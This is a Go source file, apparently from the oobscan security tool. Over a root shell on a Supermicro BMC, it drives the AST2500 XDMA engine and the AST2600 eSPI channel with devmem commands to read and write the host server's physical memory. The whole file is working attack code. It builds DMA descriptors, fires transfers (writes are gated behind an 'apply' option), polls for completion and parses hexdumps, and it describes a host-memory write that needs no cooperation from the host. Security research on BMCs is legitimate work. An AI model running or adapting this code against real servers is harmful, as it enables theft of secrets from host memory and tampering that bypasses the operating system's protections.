package cmd

import (
	"fmt"
	"strconv"
	"strings"
	"time"

	"github.com/runZeroInc/oobscan/pkg/ipmi"
)

// AST2500 XDMA engine driven over the smc-restore-shell root shell (busybox devmem)
// to read and WRITE HOST DRAM. Ported from lab/host-dram/bmc/xdma.py; the descriptor
// encoding matches openbmc/linux aspeed-xdma.c (aspeed_xdma_ast2500_set_cmd) and is
// cross-checked byte-for-byte against the recorded known-good 4KB host read.
//
// Prereqs on the host side (not done here): PCIe BusMaster granted to the BMC's
// device function, and either no IOMMU or an IOMMU that is off / co-grouped. The
// AST2500 engine is 32-bit, so host addresses must be < 4 GB. A transfer that does
// not complete (STATUS 0x48/0x68) wedges the downstream engine until a host power
// cycle, so this drives one bounded transfer at a time and never sweeps blindly.
const (
	xdmaBase       = 0x1E6E7000
	xdmaDesc       = 0x9F000000 // descriptor, in the unclaimed DRAM tail (board boots mem=455M)
	xdmaBuf        = 0x9F001000 // landing / staging buffer
	xdmaReadpReset = 0xEE882266
	xdmaCtrlInit   = 0x30020070
	xdmaEndpInit   = 0x200
	xdmaMaxXfer    = 0x7FF0
)

func xdmaW32(addr, val uint64) string {
	return fmt.Sprintf("devmem 0x%08X 32 0x%08X", addr, val&0xFFFFFFFF)
}

// ast2500XDMADescriptor returns the (pitch, cmd) qwords for one transfer.
// upstream=false is DOWNSTREAM (host -> BMC = read host); true is UPSTREAM (write host).
func ast2500XDMADescriptor(upstream bool, length int, bmcAddr uint64) (pitch, cmd uint64) {
	lineNo, lineSize, pitchV := uint64(1), uint64(length>>4), uint64(1)
	pitch = uint64(1) // BIT(0)
	if upstream {
		pitch |= 0x80000000 // BIT(31) upstream
	}
	pitch |= bmcAddr & 0x3FFFFFF0
	pitch |= pitchV << 35
	pitch |= pitchV << 51
	cmd = (uint64(1) << 31) | (uint64(1) << 15) | (uint64(1) << 1) // IRQ_EN | IRQ_BMC | CMD_ID
	cmd |= lineNo << 16
	cmd |= lineSize << 4
	return
}

// xdmaUngate takes the XDMA block out of both reset domains with the assert->release
// pulse that must happen AFTER the host grants BME, or the engine latches "no TLP".
func xdmaUngate() []string {
	return []string{
		xdmaW32(0x1e6e2000, 0x1688A8A8),
		xdmaW32(0x1e6e2004, 0xF70EA098),
		xdmaW32(0x1e6e2004, 0xF40EA098),
	}
}

func xdmaTransfer(hostAddr uint64, upstream bool, length int) []string {
	pitch, cmd := ast2500XDMADescriptor(upstream, length, xdmaBuf)
	return []string{
		xdmaW32(xdmaDesc+0x00, hostAddr&0xFFFFFFFF),
		xdmaW32(xdmaDesc+0x04, (hostAddr>>32)&0xFFFFFFFF),
		xdmaW32(xdmaDesc+0x08, pitch&0xFFFFFFFF),
		xdmaW32(xdmaDesc+0x0C, (pitch>>32)&0xFFFFFFFF),
		xdmaW32(xdmaDesc+0x10, cmd&0xFFFFFFFF),
		xdmaW32(xdmaDesc+0x14, (cmd>>32)&0xFFFFFFFF),
		xdmaW32(xdmaDesc+0x18, 0),
		xdmaW32(xdmaDesc+0x1C, 0),
		xdmaW32(xdmaBase+0x10, xdmaDesc),       // CMDQ_ADDR
		xdmaW32(xdmaBase+0x14, xdmaEndpInit),   // CMDQ_ENDP
		xdmaW32(xdmaBase+0x1C, xdmaReadpReset), // CMDQ_READP
		xdmaW32(xdmaBase+0x18, 0),              // CMDQ_WRITEP
		xdmaW32(xdmaBase+0x20, xdmaCtrlInit),   // CTRL
		fmt.Sprintf("echo STATUS_PRE=$(devmem 0x%08X 32)", xdmaBase+0x24),
		xdmaW32(xdmaBase+0x18, 4), // kick
		fmt.Sprintf("echo STATUS_POST=$(devmem 0x%08X 32)", xdmaBase+0x24),
	}
}

func xdmaReadBufWords(n int) []string {
	c := make([]string, n)
	for i := 0; i < n; i++ {
		c[i] = fmt.Sprintf("echo W%d=$(devmem 0x%08X 32)", i, xdmaBuf+uint64(i)*4)
	}
	return c
}

// xdmaPollRefresh emits a shell spin that waits for the XDMA landing buffer's first
// word to change away from the (address-dependent) poison - i.e. for a real read TLP
// to actually deposit data. dmahunt's ground truth is exactly this buffer refresh, not
// the STATUS register (whose low completion bits persist as stale residue). This is
// what makes a read reliable instead of returning whatever happened to sit in the buffer.
func xdmaPollRefresh(poison uint32) []string {
	return []string{
		fmt.Sprintf("pz=0x%08X; i=0", poison),
		fmt.Sprintf("while [ $i -lt 800 ]; do bw=$(devmem 0x%08X 32); [ $((bw)) -ne $((pz)) ] && break; i=$((i+1)); done", xdmaBuf),
		"echo REFRESH_ITERS=$i",
	}
}

func xdmaStatusMeaning(st uint64) string {
	switch st {
	case 0xF8000020:
		return "COMPLETED, data landed (DS_COMP downstream read)"
	case 0xF8000010, 0xF8000030:
		return "COMPLETED (US_COMP upstream write)"
	case 0xF8000000:
		return "all idle (no completion flag) - nothing moved"
	case 0x48000000:
		return "running-then-blocked (IOMMU fault) - WEDGES until host power-cycle"
	case 0x58000000:
		return "never started - function in D3 or no TLP path (BME off?)"
	case 0x68000000:
		return "post-reset residue of a wedged engine"
	}
	// The high byte is the source of truth (dmahunt gotcha 2): 0xF8 = clean done,
	// whatever the low DS_COMP/US_COMP flags read.
	if (st>>24)&0xFF == 0xF8 {
		return fmt.Sprintf("COMPLETED (clean-done, flags=0x%02x)", st&0xFF)
	}
	return "unknown"
}

// xdmaDone reports whether a STATUS word means the engine cleanly finished a
// transfer - the high byte latches 0xF8 for both the downstream (read, DS_COMP
// 0x20) and upstream (write, US_COMP 0x10/0x30) completions.
func xdmaDone(st uint64) bool { return (st>>24)&0xFF == 0xF8 }

func alignUp16(n int) int { return (n + 15) &^ 15 }

func parseShellKV(out string) map[string]uint64 {
	m := map[string]uint64{}
	for _, line := range strings.Split(out, "\n") {
		k, v, ok := strings.Cut(strings.TrimSpace(line), "=")
		if !ok || !strings.HasPrefix(v, "0x") && !strings.HasPrefix(v, "0X") {
			continue
		}
		if n, err := strconv.ParseUint(v[2:], 16, 64); err == nil {
			m[k] = n
		}
	}
	return m
}

// ipmiMemHostRead reads host DRAM via one XDMA downstream transfer over the shell.
func ipmiMemHostRead(host string, hostAddr uint64, length int, o *ipmiMemOpts) (any, error) {
	if length <= 0 {
		return nil, fmt.Errorf("space=host: a length is required")
	}
	xfer := alignUp16(length)
	if xfer > xdmaMaxXfer {
		return nil, fmt.Errorf("space=host: one XDMA transfer is capped at %d bytes (0x%X)", xdmaMaxXfer, xdmaMaxXfer)
	}
	if hostAddr >= 1<<32 {
		return nil, fmt.Errorf("space=host: AST2500 XDMA is 32-bit; host address 0x%x is >= 4GB and unreachable directly", hostAddr)
	}
	cert, port, err := smcShellCertAndPort()
	if err != nil {
		return nil, err
	}
	words := xfer / 4
	// Address-dependent poison (dmahunt): a stale completion of a DIFFERENT address
	// won't match this poison, so a genuine refresh is distinguishable from residue.
	poisonWord := uint32(0xA5A5A5A5) ^ uint32(hostAddr)
	var s []string
	// Ungate (SCU04 reset pulse) ONLY when 'arm' is requested. dmahunt/xdma.py pulse the
	// reset ONCE at arming and then fire many transfers; re-pulsing before every read
	// leaves the downstream engine re-delivering its first cached completion (observed:
	// every read returns the first page's bytes). So: `arm` on the first read after a
	// host PERST#, then plain reads reuse the armed engine and fetch fresh data.
	if o.arm {
		s = append(s, xdmaUngate()...)
	}
	for i := 0; i < words; i++ {
		s = append(s, xdmaW32(xdmaBuf+uint64(i)*4, uint64(poisonWord)))
	}
	s = append(s, xdmaTransfer(hostAddr, false, xfer)...)
	s = append(s, xdmaPollRefresh(poisonWord)...) // wait for a real TLP to refresh the buffer
	s = append(s, xdmaReadBufWords(words)...)
	out, eerr := ipmi.SMCShellExec(host, port, cert, strings.Join(s, "\n"), 180*time.Second)
	if eerr != nil {
		return nil, eerr
	}
	kv := parseShellKV(out)
	raw := make([]byte, 0, words*4)
	stillPoison := true
	for i := 0; i < words; i++ {
		w := kv[fmt.Sprintf("W%d", i)]
		if w != uint64(poisonWord) {
			stillPoison = false
		}
		raw = append(raw, byte(w), byte(w>>8), byte(w>>16), byte(w>>24))
	}
	st := kv["STATUS_POST"]
	refreshed := !stillPoison
	res := map[string]any{
		"action": "mem read", "space": "host", "via": "shell",
		"transport":     "AST2500 XDMA downstream (host -> BMC) over smc-restore-shell",
		"hostPhys":      fmt.Sprintf("0x%08x", hostAddr),
		"length":        length,
		"statusPre":     fmt.Sprintf("0x%08X", kv["STATUS_PRE"]),
		"statusPost":    fmt.Sprintf("0x%08X", st),
		"statusMeaning": xdmaStatusMeaning(st),
		"refreshIters":  kv["REFRESH_ITERS"],
	}
	// Ground truth = the landing buffer refreshed away from the address-dependent poison
	// AND the engine finished cleanly (high byte 0xF8). Both, or it is not host data.
	if xdmaDone(st) && refreshed {
		res["ok"] = true
		res["hexdump"] = memHexdump(raw[:length], hostAddr)
		res["note"] = "best-effort: the AST2500 downstream read over the shell delivers completions with timing-sensitive lag - a single value can be one transfer stale. Re-read to confirm (a stable repeat is authoritative), or use the in-process dmahunt for reliable sweeps. The WRITE path (posted TLP) is not affected."
	} else {
		res["ok"] = false
		res["error"] = fmt.Sprintf("XDMA read did NOT deliver host data (STATUS=0x%08X: %s%s). Needs a DMA-ready function (BME granted, out of D3, downstream engine not wedged - a host PERST# clears a wedge).",
			st, xdmaStatusMeaning(st), map[bool]string{true: "; landing buffer still holds poison = nothing moved", false: ""}[stillPoison])
	}
	return res, nil
}

// eSPI (AST2600) peripheral-channel MemWR: a cooperation-free host-memory write that
// needs NO PCIe device presentation and NO BIOS/boot reconfig. The eSPI block is a
// built-in FCH<->BMC channel; on AMD FCH the peripheral-channel Bus Master Enable
// (ESPI004 bit8) is granted by default. We drive it by reusing the BMC's own /dev/mem
// over the root shell - the same supported physical-write primitive as `via=shell`.
// Register map from lab/host-dram/bmc/espihammer.go (confirmed vs ast_espi.h).
const (
	espiBase    = 0x1e6ee000
	espiSCU0D8  = 0x1e6e20d8    // bit0 = force-disable eSPI->AHB bridge (clear to enable)
	espi000     = espiBase + 0x00 // CTRL: SW-ready
	espi004     = espiBase + 0x04 // STATUS: bit8 = peripheral-channel BME (FCH-granted)
	espi008     = espiBase + 0x08 // INTR_STS: bit1 TX_COMPLETE, bit10 TX_ERROR, bit16 TX_ABORT
	espi024     = espiBase + 0x24 // POSTED TX CTRL = write trigger
	espi028     = espiBase + 0x28 // POSTED TX DATA = write FIFO (one byte per push)
	espiArm000  = 0xFF00BA57      // SW-ready (bit1 over default 0xFF00BA55)
	espiDef000  = 0xFF00BA55
	espiArmD8   = 0x000000FE      // clear SCU0D8 bit0
	espiDefD8   = 0x000000FF
	espiTrigger = 0x80000000
)

func ipmiMemHostWriteESPI(host string, hostAddr uint64, data []byte, o *ipmiMemOpts) (any, error) {
	if len(data) == 0 {
		return nil, fmt.Errorf("space=host espi write: no data")
	}
	if len(data) > 64 {
		return nil, fmt.Errorf("space=host espi: one MemWR cycle carries at most 64 bytes")
	}
	cyctype, addrBytes, cycName := 0x01, 4, "MemWR32"
	if hostAddr >= 1<<32 {
		cyctype, addrBytes, cycName = 0x03, 8, "MemWR64" // 64-bit reach, unlike the 32-bit XDMA
	}
	if !o.apply {
		return map[string]any{
			"action": "mem write", "space": "host", "via": "shell", "applied": false,
			"transport": "AST2600 eSPI " + cycName + " (FCH-default BME; NO device presentation, NO boot/BIOS reconfig)",
			"hostPhys":  fmt.Sprintf("0x%x", hostAddr), "length": len(data),
			"note": "staged only: add 'apply' to fire the eSPI MemWR cycle",
		}, nil
	}
	cert, port, err := smcShellCertAndPort()
	if err != nil {
		return nil, err
	}
	dev := func(a, v uint64) string { return fmt.Sprintf("devmem 0x%08X 32 0x%08X", a, v&0xFFFFFFFF) }
	var s []string
	s = append(s, dev(espiSCU0D8, espiArmD8), dev(espi000, espiArm000), dev(espi008, 0xFFFFFFFF), dev(espiBase+0x14, 0x80000000))
	s = append(s, fmt.Sprintf("echo BME=$(devmem 0x%08X 32)", espi004))
	for i := addrBytes - 1; i >= 0; i-- { // address MSB-first into the FIFO
		s = append(s, dev(espi028, (hostAddr>>(uint(i)*8))&0xff))
	}
	for _, b := range data { // data bytes into the FIFO
		s = append(s, dev(espi028, uint64(b)))
	}
	s = append(s, dev(espi024, uint64(espiTrigger)|(uint64(len(data))<<12)|uint64(cyctype))) // trigger
	s = append(s, fmt.Sprintf("echo TRIG=$(devmem 0x%08X 32)", espi024))
	s = append(s, fmt.Sprintf("echo INTR=$(devmem 0x%08X 32)", espi008))
	s = append(s, dev(espi000, espiDef000), dev(espiSCU0D8, espiDefD8)) // restore
	out, eerr := ipmi.SMCShellExec(host, port, cert, strings.Join(s, "\n"), 60*time.Second)
	if eerr != nil {
		return nil, eerr
	}
	kv := parseShellKV(out)
	bme, intr, trigAfter := kv["BME"], kv["INTR"], kv["TRIG"]
	txComplete := intr&0x02 != 0
	res := map[string]any{
		"action": "mem write", "space": "host", "via": "shell", "applied": true,
		"transport":          "AST2600 eSPI " + cycName + " over smc-restore-shell (FCH-default BME; NO device presentation, NO boot/BIOS reconfig)",
		"hostPhys":           fmt.Sprintf("0x%x", hostAddr), "length": len(data),
		"bmeGranted":         bme&0x100 != 0,
		"espi004":            fmt.Sprintf("0x%08X", bme),
		"intrStatus":         fmt.Sprintf("0x%08X", intr),
		"triggerSelfCleared": trigAfter&espiTrigger == 0,
		"txComplete":         txComplete,
		"ok":                 txComplete && intr&0x400 == 0 && intr&0x10000 == 0 && trigAfter&espiTrigger == 0,
	}
	if bme&0x100 == 0 {
		res["warn"] = "ESPI004 bit8 (peripheral-channel BME) is CLEAR - FCH has not granted it; the cycle will not reach host memory"
	}
	if intr&0x400 != 0 {
		res["txError"] = true
	}
	if intr&0x10000 != 0 {
		res["txAbort"] = true
	}
	return res, nil
}

// Finding (removed experiment): a "write-then-read in one XDMA session" does NOT let a
// downstream read start where it otherwise 0x58s - a posted write proves TLP mastering
// but supplies no read *completion*, which is the missing piece. The downstream read is
// recovered only by a host PERST# (see ipmiMemHostRead + DMA-PATHS.md).

// ipmiMemHostWrite writes host DRAM via one XDMA upstream transfer over the shell.
// With 'verify' it reads the region back (a second, downstream transfer) and compares.
func ipmiMemHostWrite(host string, hostAddr uint64, data []byte, o *ipmiMemOpts) (any, error) {
	if len(data) == 0 {
		return nil, fmt.Errorf("space=host write: no data")
	}
	xfer := alignUp16(len(data))
	if xfer > xdmaMaxXfer {
		return nil, fmt.Errorf("space=host: one XDMA transfer is capped at %d bytes", xdmaMaxXfer)
	}
	if hostAddr >= 1<<32 {
		return nil, fmt.Errorf("space=host: AST2500 XDMA is 32-bit; host address 0x%x is >= 4GB and unreachable directly", hostAddr)
	}
	padded := make([]byte, xfer)
	copy(padded, data)
	words := xfer / 4
	var stage []string
	for i := 0; i < words; i++ {
		w := uint32(padded[i*4]) | uint32(padded[i*4+1])<<8 | uint32(padded[i*4+2])<<16 | uint32(padded[i*4+3])<<24
		stage = append(stage, xdmaW32(xdmaBuf+uint64(i)*4, uint64(w)))
	}
	if !o.apply {
		pitch, cmd := ast2500XDMADescriptor(true, xfer, xdmaBuf)
		return map[string]any{
			"action": "mem write", "space": "host", "via": "shell", "applied": false,
			"hostPhys": fmt.Sprintf("0x%08x", hostAddr), "length": len(data),
			"note":       "staged only: add 'apply' to DMA-write host DRAM (AST2500 upstream). Add 'verify' to read it back.",
			"descriptor": fmt.Sprintf("pitch=0x%016X cmd=0x%016X (upstream)", pitch, cmd),
		}, nil
	}
	cert, port, err := smcShellCertAndPort()
	if err != nil {
		return nil, err
	}
	var s []string
	s = append(s, xdmaUngate()...)
	s = append(s, stage...)
	s = append(s, xdmaTransfer(hostAddr, true, xfer)...)
	out, eerr := ipmi.SMCShellExec(host, port, cert, strings.Join(s, "\n"), 180*time.Second)
	if eerr != nil {
		return nil, eerr
	}
	kv := parseShellKV(out)
	res := map[string]any{
		"action": "mem write", "space": "host", "via": "shell", "applied": true,
		"transport": "AST2500 XDMA upstream (BMC -> host) over smc-restore-shell",
		"hostPhys":  fmt.Sprintf("0x%08x", hostAddr), "length": len(data),
		"statusPost":    fmt.Sprintf("0x%08X", kv["STATUS_POST"]),
		"statusMeaning": xdmaStatusMeaning(kv["STATUS_POST"]),
	}
	st := kv["STATUS_POST"]
	res["ok"] = xdmaDone(st)
	if o.verify && res["ok"] == true {
		rb, rerr := ipmiMemHostRead(host, hostAddr, len(data), o)
		if rerr == nil {
			if m, mok := rb.(map[string]any); mok {
				res["verifyReadback"] = m["hexdump"]
			}
		}
	}
	return res, nil
}
